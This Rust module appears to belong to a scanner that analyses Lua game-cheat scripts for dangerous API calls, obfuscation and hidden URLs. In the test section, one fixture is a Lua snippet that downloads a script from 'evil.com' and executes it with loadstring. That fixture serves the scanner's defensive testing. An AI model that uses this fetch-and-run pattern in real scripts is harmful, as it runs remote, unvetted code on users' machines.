//! Script Shield parser modules for analyzing Lua cheat scripts.
//!
//! Parses Lua scripts to extract URLs (including obfuscated ones),
//! identify dangerous API calls, and detect obfuscation techniques.

pub mod deobfuscator;
pub mod lua_parser;
pub mod url_extractor;

pub use deobfuscator::{DeobLevel, DeobfuscationResult, LuaDeobfuscator};
pub use lua_parser::{ApiCall, ApiCategory, LuaParser};
pub use url_extractor::{ExtractionMethod, ExtractedUrl, UrlExtractor};

use anyhow::Result;
use serde::{Deserialize, Serialize};

/// The result of parsing a Lua script for threats.
#[derive(Debug, Clone, Serialize, Deserialize)]
pub struct ParseResult {
    /// URLs found in the script (plain or obfuscated).
    pub urls: Vec<ExtractedUrl>,
    /// API calls found in the script.
    pub api_calls: Vec<ApiCall>,
    /// Whether obfuscation was detected in the script.
    pub obfuscation_detected: bool,
    /// The type/name of obfuscator if identified.
    pub obfuscation_type: Option<String>,
    /// High-level risk indicators describing why the script is suspicious.
    pub risk_indicators: Vec<String>,
    /// Raw string literals extracted from the script.
    pub raw_strings: Vec<String>,
}

/// Top-level script parser that orchestrates all sub-parsers.
#[derive(Debug, Clone)]
pub struct ScriptParser {
    lua_parser: LuaParser,
    url_extractor: UrlExtractor,
    deobfuscator: LuaDeobfuscator,
}

impl Default for ScriptParser {
    fn default() -> Self {
        Self::new()
    }
}

impl ScriptParser {
    /// Create a new `ScriptParser` with default configuration.
    pub fn new() -> Self {
        Self {
            lua_parser: LuaParser::new(),
            url_extractor: UrlExtractor::new(),
            deobfuscator: LuaDeobfuscator::new(),
        }
    }

    /// Parse a Lua script and return a comprehensive analysis.
    pub fn parse(&self, script: &str) -> Result<ParseResult> {
        // Step 1: Attempt deobfuscation to reveal hidden content.
        let deob_result = self.deobfuscator.deobfuscate(script);

        // Determine which script text to analyze: use deobfuscated code if
        // meaningful deobfuscation occurred, otherwise the original.
        let analysis_target = if deob_result.deobfuscation_level != DeobLevel::None {
            &deob_result.deobfuscated_code
        } else {
            script
        };

        // Step 2: Extract API calls from the script.
        let api_calls = self.lua_parser.parse_api_calls(analysis_target);

        // Step 3: Extract URLs (from both original and deobfuscated text).
        let mut urls = self.url_extractor.extract_urls(script);
        if deob_result.deobfuscation_level != DeobLevel::None {
            let deob_urls = self.url_extractor.extract_urls(&deob_result.deobfuscated_code);
            for url in deob_urls {
                if !urls.iter().any(|u| u.url == url.url) {
                    urls.push(url);
                }
            }
        }

        // Also include any URLs found during deobfuscation itself.
        for hidden_url in &deob_result.hidden_urls {
            if !urls.iter().any(|u| &u.url == hidden_url) {
                urls.push(ExtractedUrl {
                    url: hidden_url.clone(),
                    extraction_method: ExtractionMethod::Base64Encoded,
                    line_number: 0,
                    is_obfuscated: true,
                    confidence: 0.7,
                });
            }
        }

        // Step 4: Extract raw string literals from the script.
        let raw_strings = Self::extract_raw_strings(script);

        // Step 5: Build risk indicators.
        let risk_indicators = Self::build_risk_indicators(&api_calls, &urls, &deob_result);

        let obfuscation_detected =
            deob_result.deobfuscation_level != DeobLevel::None || deob_result.obfuscator_name.is_some();

        Ok(ParseResult {
            urls,
            api_calls,
            obfuscation_detected,
            obfuscation_type: deob_result.obfuscator_name,
            risk_indicators,
            raw_strings,
        })
    }

    /// Extract raw string literals (single and double quoted) from a Lua script.
    fn extract_raw_strings(script: &str) -> Vec<String> {
        let mut strings = Vec::new();
        let re = regex::Regex::new(r#"(?:"([^"\\]*(?:\\.[^"\\]*)*)"|'([^'\\]*(?:\\.[^'\\]*)*)')"#)
            .expect("valid regex");

        for cap in re.captures_iter(script) {
            let s = cap
                .get(1)
                .or_else(|| cap.get(2))
                .map(|m| m.as_str().to_string())
                .unwrap_or_default();
            if !s.is_empty() {
                strings.push(s);
            }
        }

        strings
    }

    /// Build human-readable risk indicators based on analysis results.
    fn build_risk_indicators(
        api_calls: &[ApiCall],
        urls: &[ExtractedUrl],
        deob: &DeobfuscationResult,
    ) -> Vec<String> {
        let mut indicators = Vec::new();

        // Check for dangerous API calls.
        let dangerous_count = api_calls.iter().filter(|c| c.is_dangerous).count();
        if dangerous_count > 0 {
            indicators.push(format!(
                "Found {} dangerous API call(s)",
                dangerous_count
            ));
        }

        // Check for web request calls.
        let web_calls: Vec<_> = api_calls
            .iter()
            .filter(|c| matches!(c.category, ApiCategory::WebRequest))
            .collect();
        if !web_calls.is_empty() {
            indicators.push(format!(
                "Script makes {} web request(s)",
                web_calls.len()
            ));
        }

        // Check for file system access.
        if api_calls
            .iter()
            .any(|c| matches!(c.category, ApiCategory::FileWrite))
        {
            indicators.push("Script writes to the file system".to_string());
        }

        // Check for system command execution.
        if api_calls
            .iter()
            .any(|c| matches!(c.category, ApiCategory::SystemCommand))
        {
            indicators.push("Script executes system commands".to_string());
        }

        // Check for data exfiltration.
        if api_calls
            .iter()
            .any(|c| matches!(c.category, ApiCategory::DataExfiltration))
        {
            indicators.push("Script may exfiltrate data".to_string());
        }

        // Check for obfuscated URLs.
        let obfuscated_urls = urls.iter().filter(|u| u.is_obfuscated).count();
        if obfuscated_urls > 0 {
            indicators.push(format!(
                "Found {} obfuscated URL(s)",
                obfuscated_urls
            ));
        }

        // Check for obfuscation.
        if deob.deobfuscation_level != DeobLevel::None {
            indicators.push("Script uses obfuscation techniques".to_string());
        }
        if let Some(ref name) = deob.obfuscator_name {
            indicators.push(format!("Known obfuscator detected: {}", name));
        }

        // Check for loadstring usage (dynamic code execution).
        if api_calls
            .iter()
            .any(|c| c.function_name == "loadstring")
        {
            indicators.push("Script uses dynamic code execution (loadstring)".to_string());
        }

        // Check for environment manipulation.
        if api_calls
            .iter()
            .any(|c| matches!(c.category, ApiCategory::ProcessManipulation))
        {
            indicators.push("Script manipulates the Lua environment".to_string());
        }

        indicators
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_parse_clean_script() {
        let parser = ScriptParser::new();
        let result = parser.parse("print('hello world')").unwrap();
        assert!(result.urls.is_empty());
        assert!(!result.obfuscation_detected);
    }

    #[test]
    fn test_parse_script_with_url_and_api() {
        let parser = ScriptParser::new();
        let script = r#"
            local http = game:GetService("HttpService")
            local data = http:GetAsync("https://evil.com/payload.lua")
            loadstring(data)()
        "#;
        let result = parser.parse(script).unwrap();
        assert!(!result.urls.is_empty());
        assert!(!result.api_calls.is_empty());
        assert!(!result.risk_indicators.is_empty());
    }
}
